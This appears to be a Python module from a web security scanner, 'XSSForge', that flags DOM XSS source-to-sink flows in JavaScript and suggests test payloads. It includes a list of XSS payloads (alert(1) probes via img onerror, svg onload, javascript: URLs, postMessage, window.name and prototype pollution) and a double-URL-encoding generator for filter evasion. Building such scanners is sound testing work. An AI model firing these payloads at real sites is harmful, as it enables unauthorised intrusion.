#!/usr/bin/env python3
"""
XSSForge Enhanced DOM XSS Detection Module

Advanced DOM XSS detection that addresses Dalfox limitations:
- JSON response handling (Dalfox false positive issue)
- Double URL encoding detection
- Comprehensive sink/source tracking
- PostMessage exploitation
- Client-side prototype pollution to XSS

This module significantly improves upon Dalfox's DOM XSS capabilities.
"""

import re
from dataclasses import dataclass
from typing import Optional, Tuple
from enum import Enum


class DOMXSSRisk(Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class DOMXSSFinding:
    """DOM XSS vulnerability finding."""
    risk: DOMXSSRisk
    source: str
    sink: str
    code_context: str
    payload_suggestion: str
    verified: bool = False
    notes: str = ""

    def to_json(self) -> dict:
        return {
            "risk": self.risk.value,
            "source": self.source,
            "sink": self.sink,
            "code_context": self.code_context[:200],
            "payload_suggestion": self.payload_suggestion,
            "verified": self.verified,
            "notes": self.notes,
        }


# ============================================================================
# Comprehensive DOM XSS Sources
# ============================================================================

DOM_SOURCES = {
    "url": [
        "location",
        "location.href",
        "location.search",
        "location.hash",
        "location.pathname",
        "location.origin",
        "location.protocol",
        "location.host",
        "location.hostname",
        "location.port",
        "document.URL",
        "document.documentURI",
        "document.baseURI",
        "document.referrer",
        "window.location",
    ],
    "storage": [
        "localStorage.getItem",
        "sessionStorage.getItem",
        "localStorage[",
        "sessionStorage[",
        "IndexedDB",
    ],
    "communication": [
        "window.name",
        "postMessage",
        "onmessage",
        "message.data",
        "event.data",
        "e.data",
        "MessageEvent",
    ],
    "navigation": [
        "history.pushState",
        "history.replaceState",
        "history.state",
    ],
    "input": [
        "document.cookie",
        "document.domain",
        "FileReader",
        "Blob",
        "clipboardData",
    ],
    "network": [
        "XMLHttpRequest",
        "fetch(",
        "WebSocket",
        "$.ajax",
        "$.get",
        "$.post",
        "axios",
    ],
}

# ============================================================================
# DOM XSS Sinks by Severity
# ============================================================================

DOM_SINKS = {
    "critical": {
        "description": "Direct code execution",
        "sinks": [
            ("eval(", "Arbitrary JavaScript execution"),
            ("Function(", "Dynamic function creation"),
            ("setTimeout(", "Delayed code execution"),
            ("setInterval(", "Periodic code execution"),
            ("setImmediate(", "Immediate code execution"),
            ("execScript(", "IE script execution"),
            ("msSetImmediate(", "IE immediate execution"),
            (".constructor(", "Constructor-based execution"),
        ],
    },
    "high": {
        "description": "HTML injection leading to XSS",
        "sinks": [
            (".innerHTML", "HTML content injection"),
            (".outerHTML", "Element replacement"),
            ("document.write(", "Document write injection"),
            ("document.writeln(", "Document write injection"),
            (".insertAdjacentHTML(", "HTML insertion"),
            ("createContextualFragment(", "Fragment creation"),
            ("DOMParser", "DOM parsing"),
            (".srcdoc", "Iframe source document"),
        ],
    },
    "medium": {
        "description": "URL/attribute-based XSS",
        "sinks": [
            (".href", "URL assignment (javascript:)"),
            (".src", "Source URL assignment"),
            (".action", "Form action"),
            (".formAction", "Button form action"),
            (".data", "Object data"),
            ("window.open(", "Window opening"),
            ("location.assign(", "Location assignment"),
            ("location.replace(", "Location replacement"),
            ("location=", "Direct location assignment"),
            ("location.href=", "Location href assignment"),
        ],
    },
    "low": {
        "description": "Text/attribute injection (context-dependent)",
        "sinks": [
            (".textContent", "Text content (usually safe)"),
            (".innerText", "Inner text (usually safe)"),
            (".value", "Input value"),
            (".setAttribute(", "Attribute setting"),
            (".className", "Class name"),
            ("classList.add", "Class addition"),
            (".style", "Style modification"),
        ],
    },
}


# ============================================================================
# Special Payloads for DOM XSS
# ============================================================================

DOM_XSS_PAYLOADS = {
    # Hash-based (#)
    "hash": [
        "#<img src=x onerror=alert(1)>",
        "#<svg/onload=alert(1)>",
        "#javascript:alert(1)",
        "#\"><script>alert(1)</script>",
        "#'-alert(1)-'",
        "#\";alert(1)//",
    ],
    # Search-based (?)
    "search": [
        "?q=<img src=x onerror=alert(1)>",
        "?search=<svg/onload=alert(1)>",
        "?redirect=javascript:alert(1)",
        "?url=javascript:alert(1)",
        "?callback=alert",
        "?jsonp=alert",
    ],
    # PostMessage
    "postmessage": [
        "<script>parent.postMessage('<img src=x onerror=alert(1)>','*')</script>",
        "<script>window.opener.postMessage('alert(1)','*')</script>",
    ],
    # window.name
    "windowname": [
        "<script>window.name='<img src=x onerror=alert(1)>'</script>",
    ],
    # Prototype pollution
    "prototype": [
        "__proto__[innerHTML]=<img src=x onerror=alert(1)>",
        "constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>",
        "__proto__.innerHTML=<img src=x onerror=alert(1)>",
    ],
}


# ============================================================================
# JSON Response Handler (Fixes Dalfox false positive issue)
# ============================================================================

def is_json_response(content_type: str, body: str) -> bool:
    """Check if response is JSON (common Dalfox false positive)."""
    # Check content-type header
    if content_type:
        ct_lower = content_type.lower()
        if "application/json" in ct_lower or "text/json" in ct_lower:
            return True

    # Check if body looks like JSON
    body_stripped = body.strip()
    if body_stripped.startswith(("{", "[")) and body_stripped.endswith(("}", "]")):
        try:
            import json
            json.loads(body_stripped)
            return True
        except:
            pass

    return False


def check_xss_in_json(payload: str, body: str) -> Tuple[bool, str]:
    """
    Check if XSS in JSON response is actually exploitable.

    Returns (is_vulnerable, reason)

    JSON-reflected XSS is typically NOT exploitable unless:
    1. Response is rendered as HTML (wrong Content-Type)
    2. JSONP callback is controllable
    3. Response is used in innerHTML/eval on client
    """
    # If payload is just in a JSON string value, it's NOT vulnerable
    try:
        import json
        data = json.loads(body)
        # Payload is safely JSON-encoded, not XSS
        return False, "Payload is JSON-encoded (not exploitable)"
    except:
        pass

    # Check for JSONP callback injection
    jsonp_pattern = r'^[a-zA-Z_$][a-zA-Z0-9_$]*\s*\('
    if re.match(jsonp_pattern, body.strip()):
        # Might be exploitable via callback
        return True, "Possible JSONP callback injection"

    return False, "JSON response - needs further verification"


# ============================================================================
# Double URL Encoding Detection (Fixes Dalfox limitation)
# ============================================================================

def generate_double_encoded_payloads(payload: str) -> list[str]:
    """
    Generate double URL-encoded variants.

    This addresses Dalfox's failure to detect double-encoded XSS.
    """
    from urllib.parse import quote

    variants = [
        payload,  # Original
        quote(payload),  # Single encoded
        quote(quote(payload)),  # Double encoded
        quote(payload, safe=""),  # Single encoded (no safe chars)
        quote(quote(payload, safe=""), safe=""),  # Double encoded (no safe chars)
    ]

    # Also try mixed encoding
    mixed = payload.replace("<", "%253C").replace(">", "%253E")
    variants.append(mixed)

    return list(set(variants))


# ============================================================================
# DOM XSS Analyzer
# ============================================================================

class DOMXSSAnalyzer:
    """
    Comprehensive DOM XSS analyzer.

    Improvements over Dalfox:
    1. Proper JSON response handling (no false positives)
    2. Double URL encoding detection
    3. PostMessage sink analysis
    4. Prototype pollution to XSS detection
    5. Better sink/source correlation
    """

    def __init__(self, verbose: bool = False):
        self.verbose = verbose
        self.findings: list[DOMXSSFinding] = []

    def analyze_javascript(self, js_code: str) -> list[DOMXSSFinding]:
        """Analyze JavaScript code for DOM XSS patterns."""
        findings = []

        # Flatten source list
        all_sources = []
        for category, sources in DOM_SOURCES.items():
            for source in sources:
                all_sources.append((category, source))

        # Check each sink
        for severity, sink_info in DOM_SINKS.items():
            for sink_pattern, sink_desc in sink_info["sinks"]:
                if sink_pattern in js_code:
                    # Find all occurrences
                    for match in re.finditer(re.escape(sink_pattern), js_code):
                        # Get surrounding context
                        start = max(0, match.start() - 150)
                        end = min(len(js_code), match.end() + 150)
                        context = js_code[start:end]

                        # Check if any source flows to this sink
                        connected_sources = []
                        for category, source in all_sources:
                            if source in context:
                                connected_sources.append((category, source))

                        if connected_sources:
                            # We have a potential flow!
                            risk = DOMXSSRisk(severity)
                            source_str = ", ".join(f"{s[1]} ({s[0]})" for s in connected_sources[:3])

                            # Generate payload suggestion
                            payload = self._suggest_payload(sink_pattern, connected_sources)

                            finding = DOMXSSFinding(
                                risk=risk,
                                source=source_str,
                                sink=f"{sink_pattern} - {sink_desc}",
                                code_context=context,
                                payload_suggestion=payload,
                                notes=f"Sink: {sink_desc}",
                            )
                            findings.append(finding)

        self.findings.extend(findings)
        return findings

    def _suggest_payload(self, sink: str, sources: list) -> str:
        """Suggest a payload based on sink and source types."""
        source_categories = [s[0] for s in sources]

        # Hash-based source
        if any("location.hash" in s[1] for s in sources):
            return "#<img src=x onerror=alert(1)>"

        # Search-based source
        if any("location.search" in s[1] for s in sources):
            return "?param=<img src=x onerror=alert(1)>"

        # PostMessage source
        if "communication" in source_categories:
            return "postMessage('<img src=x onerror=alert(1)>','*')"

        # window.name source
        if any("window.name" in s[1] for s in sources):
            return "Open page with window.name='<img src=x onerror=alert(1)>'"

        # Generic based on sink
        if "innerHTML" in sink or "outerHTML" in sink:
            return "<img src=x onerror=alert(1)>"
        elif "eval" in sink or "Function" in sink:
            return "alert(1)"
        elif ".href" in sink or ".src" in sink:
            return "javascript:alert(1)"

        return "<script>alert(1)</script>"

    def check_postmessage_vulnerability(self, js_code: str) -> list[DOMXSSFinding]:
        """Check for insecure postMessage handlers."""
        findings = []

        # Look for message event listeners without origin check
        patterns = [
            # addEventListener without origin check
            r'addEventListener\s*\(\s*["\']message["\'][^}]*function\s*\([^)]*\)\s*{[^}]*(?!origin)[^}]*}',
            # onmessage without origin check
            r'\.onmessage\s*=\s*function\s*\([^)]*\)\s*{[^}]*(?!origin)[^}]*}',
            # jQuery
            r'\$\(window\)\.on\s*\(\s*["\']message["\'][^}]*(?!origin)',
        ]

        for pattern in patterns:
            for match in re.finditer(pattern, js_code, re.IGNORECASE | re.DOTALL):
                context = match.group(0)[:200]

                # Check if there's any sink in this handler
                has_sink = False
                for severity, sink_info in DOM_SINKS.items():
                    for sink_pattern, _ in sink_info["sinks"]:
                        if sink_pattern in context:
                            has_sink = True
                            break

                if has_sink:
                    findings.append(DOMXSSFinding(
                        risk=DOMXSSRisk.HIGH,
                        source="postMessage (no origin check)",
                        sink="Message handler with DOM manipulation",
                        code_context=context,
                        payload_suggestion="postMessage('<img src=x onerror=alert(1)>','*')",
                        notes="PostMessage handler without origin validation",
                    ))

        return findings

    def check_prototype_pollution(self, js_code: str) -> list[DOMXSSFinding]:
        """Check for prototype pollution to DOM XSS chains."""
        findings = []

        # Patterns indicating potential prototype pollution
        pollution_patterns = [
            r'Object\.assign\s*\([^)]*,\s*[^)]*\)',
            r'\[\s*["\'][^"\']*["\']\s*\]\s*=',
            r'\.merge\s*\(',
            r'\.extend\s*\(',
            r'JSON\.parse\s*\([^)]*\)',
        ]

        # Check if any gadgets exist
        gadgets = [
            "innerHTML", "outerHTML", "srcdoc", "src", "href",
            "textContent", "innerText", "data-", "onclick", "onerror",
        ]

        has_pollution_entry = False
        has_gadget = False

        for pattern in pollution_patterns:
            if re.search(pattern, js_code):
                has_pollution_entry = True
                break

        for gadget in gadgets:
            if gadget in js_code:
                has_gadget = True
                break

        if has_pollution_entry and has_gadget:
            findings.append(DOMXSSFinding(
                risk=DOMXSSRisk.MEDIUM,
                source="Object property assignment",
                sink="Potential prototype pollution gadget",
                code_context="Dynamic property assignment + DOM sink detected",
                payload_suggestion="?__proto__[innerHTML]=<img src=x onerror=alert(1)>",
                notes="May require prototype pollution chain",
            ))

        return findings


# ============================================================================
# Browser Verification Helpers
# ============================================================================

def generate_dom_xss_test_html(payloads: list[str]) -> str:
    """Generate HTML page to test DOM XSS payloads in browser."""
    html = """<!DOCTYPE html>
<html>
<head>
    <title>XSSForge DOM XSS Test</title>
    <script>
    window.onload = function() {
        var results = document.getElementById('results');
        var tests = %s;

        tests.forEach(function(test, i) {
            try {
                // Create isolated test
                var div = document.createElement('div');
                div.id = 'test-' + i;

                // Try innerHTML sink
                div.innerHTML = test;

                // Check if alert was called (we'll override it)
                results.innerHTML += '<p>[TEST ' + i + '] Tested: ' + test.substring(0,50) + '...</p>';
            } catch(e) {
                results.innerHTML += '<p>[ERROR ' + i + '] ' + e.message + '</p>';
            }
        });
    };

    // Capture alert
    var originalAlert = window.alert;
    window.alert = function(msg) {
        document.getElementById('results').innerHTML +=
            '<p style="color:red;font-weight:bold">[XSS CONFIRMED] Alert: ' + msg + '</p>';
    };
    </script>
</head>
<body>
    <h1>XSSForge DOM XSS Test Results</h1>
    <div id="results"></div>
</body>
</html>""" % str(payloads)

    return html


# ============================================================================
# Convenience Functions
# ============================================================================

def analyze_for_dom_xss(js_code: str, verbose: bool = False) -> list[DOMXSSFinding]:
    """Quick DOM XSS analysis of JavaScript code."""
    analyzer = DOMXSSAnalyzer(verbose=verbose)

    findings = []
    findings.extend(analyzer.analyze_javascript(js_code))
    findings.extend(analyzer.check_postmessage_vulnerability(js_code))
    findings.extend(analyzer.check_prototype_pollution(js_code))

    return findings


def get_dom_xss_payloads(source_type: str = "hash") -> list[str]:
    """Get DOM XSS payloads for a specific source type."""
    return DOM_XSS_PAYLOADS.get(source_type, DOM_XSS_PAYLOADS["hash"])
